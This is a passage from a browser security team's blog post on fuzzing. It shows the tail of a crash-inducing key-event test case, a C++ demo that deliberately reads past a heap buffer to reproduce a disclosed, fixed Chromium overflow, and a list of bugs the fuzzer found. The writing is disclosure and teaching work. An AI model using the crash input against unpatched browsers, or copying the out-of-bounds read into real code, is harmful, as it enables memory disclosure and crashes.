        <span class="na">text</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">%uA8E9%5E%uD866%uDD5E</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">unmodifiedText</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">%uD834%uDD6F%uDB43%uDD46</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">keyIdentifier</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">%26%3D%uDB40%uDCF6%u0660</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">code</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">%7C%uE468</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">key</span><span class="p">:</span> <span class="nx">unescape</span><span class="p">(</span><span class="dl">"</span><span class="s2">%uC79B%uD84A%uDFF9%uD834%uDD66%uDB42%uDDE5%uD85E%uDFD1</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">windowsVirtualKeyCode</span><span class="p">:</span> <span class="o">-</span><span class="mi">128</span><span class="p">,</span>
        <span class="na">nativeVirtualKeyCode</span><span class="p">:</span> <span class="mi">16</span><span class="p">,</span>
        <span class="na">autoRepeat</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="na">isKeypad</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="na">isSystemKey</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="na">location</span><span class="p">:</span> <span class="mi">4096</span><span class="p">,</span>
        <span class="na">commands</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">≤áÄí-</span><span class="dl">"</span><span class="p">],</span>
      <span class="p">});</span>
    <span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
  <span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>Once we were able to reliably crash the browser it turned out to be an upstream issue and so it was reported to them. The bug report is now public and you can see it <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1276331">here</a>.</p><h1 id="what-happened">What Happened</h1><p>The bug is due to <code class="language-plaintext highlighter-rouge">unmodifiedText</code> (line 11 in the last screenshot) was handled in the browser process without taking account of null termination which lead to a <a href="https://docs.microsoft.com/en-us/cpp/sanitizers/error-heap-buffer-overflow?view=msvc-170#example---classic-heap-buffer-overflow">heap buffer overflow</a> (read), as <a href="https://bugs.chromium.org/u/2585305731/">caseq@</a> (assigned to this bug) mentions: “…That said, this may lead to us sending a piece of browser memory into renderer.”</p><p>Let’s take a closer look:</p><div class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;uchar.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char16_t</span> <span class="n">char16</span><span class="p">[]</span> <span class="o">=</span> <span class="s">u"ABCD"</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">u16string</span> <span class="n">text16</span><span class="p">(</span><span class="s">u"ABCD"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"size of char16 = %zu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">char16</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="o">*</span><span class="n">char16</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"size of text16 = %zu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">text16</span><span class="p">.</span><span class="n">size</span><span class="p">());</span>
    
<span class="p">}</span>
</pre></table></code></div></div><p>Out:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>PS C:\Users\test\Desktop\mkhtbr&gt; ./test.exe
size of char16 = 5
size of text16 = 4
</pre></table></code></div></div><p>Note the above output; <code class="language-plaintext highlighter-rouge">char16_t</code> should end with a null byte which is why its size is bigger than the <code class="language-plaintext highlighter-rouge">u16string</code>. Let’s modify this to replicate the same underlying bug found:</p><div class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;uchar.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char16_t</span> <span class="o">*</span><span class="n">char16</span><span class="o">=</span><span class="p">(</span><span class="kt">char16_t</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char16_t</span><span class="p">));</span>
    <span class="n">std</span><span class="o">::</span><span class="n">u16string</span> <span class="n">text16</span><span class="p">(</span><span class="s">u"ABCD"</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"size of char16 = %zu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">char16</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="o">*</span><span class="n">char16</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"size of text16 = %zu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">text16</span><span class="p">.</span><span class="n">size</span><span class="p">());</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">text16</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">char16</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">text16</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="c1">// Try to access everything in the 'char16_t' array assuming '4' is limit.</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">;</span> <span class="n">n</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"n=%#x &amp; "</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"char16[n]=%#x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">char16</span><span class="p">[</span><span class="n">n</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We compile using AddressSanitizer by executing the following:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>clang++ -O1 -g -fsanitize=address -fno-omit-frame-pointer -o a.exe .\old.cpp 
</pre></table></code></div></div><p>Finally, we run it:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>PS C:\Users\test\Desktop\mkhtbr&gt; ./test.exe
size of char16 = 4
size of text16 = 4
n=0 &amp; char16[n]=0x41
n=0x1 &amp; char16[n]=0x42
n=0x2 &amp; char16[n]=0x43
n=0x3 &amp; char16[n]=0x44
n=0x4 &amp; =================================================================
ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11cdab3a0038 at pc 0x7ff780c517d1 bp 0x0044ccf0f4e0 sp 0x0044ccf0f528
READ of size 2 at 0x11cdab3a0038 thread T0
    #0 0x7ff780c517d0 in main C:/Users/test/Desktop/mkhtbr/./test.cpp:20:35
</pre></table></code></div></div><p>As you can see, this is the same crash as the Chromium bug. Upstream fixed it swiftly and correctly guessed it was a bug that’s been there for a while (which meant it was likely in the stable version affecting all users).</p><h1 id="conclusion">Conclusion</h1><p>We’ve only covered the initial development of this fuzzer, we’re continuously developing it by adding more APIs and running it during development. So far it has found the following security issues:</p><table><thead><tr><th>ID<th>Title<th>Upstream<th>Severity<tbody><tr><td>N/A<td>Heap UaF in edge::fre:: █ █ █ █:: █ █ █ █ █<td>No<td>High<tr><td><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1297404"> 1297404</a><td>Heap UaF in global_media_controls::MediaItemManagerImpl::HideItem<td>Yes<td>High<tr><td><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1283077"> 1283077</a><td>Heap buffer overflow read in webui tabstrip<td>Yes<td>High<tr><td><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1276331"> 1276331</a><td>Heap buffer overflow read in blink::mojom::WidgetInputHandlerProxy::DispatchEvent<td>Yes<td>High</table><p>Here is what it looks like currently when running it, it gets progressively chaotic as time goes by (not sped up and using ASan).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://microsoftedge.github.io/edgevr/assets/img/blog_img/fuzzer_bug/extui.gif" alt="screen recording of the fuzzer opening several UI" /></p><h1 id="coming-soon">Coming Soon</h1><p>We will soon be posting another guest blogpost by <a href="https://twitter.com/david_erceg">David Erceg</a> where he will discuss some of the bugs he found as well as sharing his methodology. Also included in the post will be some of the ways the Edge Security Team reacted to his reports to find variants.</p><p>Until then, <a href="https://microsoftedge.github.io/edgevr/posts/attacking-the-devtools/">check out his first guest blogpost</a> if you haven’t already.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/edgevr/categories/vulnerabilities/'>Vulnerabilities</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/edgevr/tags/fuzzing/" class="post-tag no-text-decoration" >fuzzing</a> <a href="/edgevr/tags/tips/" class="post-tag no-text-decoration" >tips</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=A Story of a Bug Found Fuzzing - Microsoft Browser Vulnerability Research&url=https://microsoftedge.github.io/edgevr/posts/a-story-of-a-bug-found-fuzzing/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=A Story of a Bug Found Fuzzing - Microsoft Browser Vulnerability Research&u=https://microsoftedge.github.io/edgevr/posts/a-story-of-a-bug-found-fuzzing/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=A Story of a Bug Found Fuzzing - Microsoft Browser Vulnerability Research&url=https://microsoftedge.github.io/edgevr/posts/a-story-of-a-bug-found-fuzzing/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://microsoftedge.github.io/edgevr/posts/a-story-of-a-bug-found-fuzzing/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/edgevr/posts/Introducing-Enhanced-Security-for-Microsoft-Edge/">Introducing Enhanced Security for Microsoft Edge</a></li><li><a href="/edgevr/posts/Super-Duper-Secure-Mode/">Super Duper Secure Mode</a></li><li><a href="/edgevr/posts/attacking-the-devtools/">Guest Blog Post - Attacking the DevTools</a></li><li><a href="/edgevr/posts/eliminating-xss-with-trusted-types/">Eliminating XSS from WebUI with Trusted Types</a></li><li><a href="/edgevr/posts/Hacking-Chrome-iOS/">iOS Chromium Overlooked and Underappreciated</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/edgevr/tags/tips/">tips</a> <a class="post-tag" href="/edgevr/tags/site-isolation/">Site Isolation</a> <a class="post-tag" href="/edgevr/tags/jit/">JIT</a> <a class="post-tag" href="/edgevr/tags/ios/">iOS</a> <a class="post-tag" href="/edgevr/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/edgevr/tags/ui/">UI</a> <a class="post-tag" href="/edgevr/tags/trusted-types/">Trusted Types</a> <a class="post-tag" href="/edgevr/tags/memory-corruption/">Memory Corruption</a> <a class="post-tag" href="/edgevr/tags/headlines/">Headlines</a> <a class="post-tag" href="/edgevr/tags/devtools/">DevTools</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/edgevr/posts/bug-bounty-hunter-to-working-at-microsoft/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 11, 2021 <i class="unloaded">2021-10-11T08:30:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bug bounty hunter to working at Microsoft</h3><div class="text-muted small"><p> I usually write about achievements in the form of a browser bug that I found interesting, in hopes that someone reading will find it useful in their own bug hunting pursuits. However, in this blog ...</p></div></div></a></div><div class="card"> <a href="/edgevr/posts/deep-dive-into-site-isolation-part-2/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Dec 28, 2020 <i class="unloaded">2020-12-28T09:25:00-08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Deep Dive into Site Isolation (Part 2)</h3><div class="text-muted small"><p> In the previous blog post, I explained how Site Isolation and related security features help mitigate attacks such as UXSS and Spectre. However, security bugs in a renderer process are really commo...</p></div></div></a></div><div class="card"> <a href="/edgevr/posts/yet-another-uaf/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Mar 2, 2021 <i class="unloaded">2021-03-02T08:00:00-08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Yet another RenderFrameHostImpl UAF</h3><div class="text-muted small"><p> Introduction Back in 2020 while reviewing Chromium code, I found issue 1068395, a Use-After-Free in Browser Process that can be used to escape the Chromium sandbox on Android Devices. This is an i...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/edgevr/posts/Introducing-Enhanced-Security-for-Microsoft-Edge/" class="btn btn-outline-primary"><p>Introducing Enhanced Security for Microsoft Edge</p></a> <a href="/edgevr/posts/memory-corruption-vulnerabilities-in-edge/" class="btn btn-outline-primary"><p>Guest Blog Post - Memory corruption vulnerabilities in Edge</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/MSEdgeDev">Microsoft Corporation</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/edgevr/tags/tips/">tips</a> <a class="post-tag" href="/edgevr/tags/site-isolation/">Site Isolation</a> <a class="post-tag" href="/edgevr/tags/jit/">JIT</a> <a class="post-tag" href="/edgevr/tags/ios/">iOS</a> <a class="post-tag" href="/edgevr/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/edgevr/tags/ui/">UI</a> <a class="post-tag" href="/edgevr/tags/trusted-types/">Trusted Types</a> <a class="post-tag" href="/edgevr/tags/memory-corruption/">Memory Corruption</a> <a class="post-tag" href="/edgevr/tags/headlines/">Headlines</a> <a class="post-tag" href="/edgevr/tags/devtools/">DevTools</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/edgevr/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://microsoftedge.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
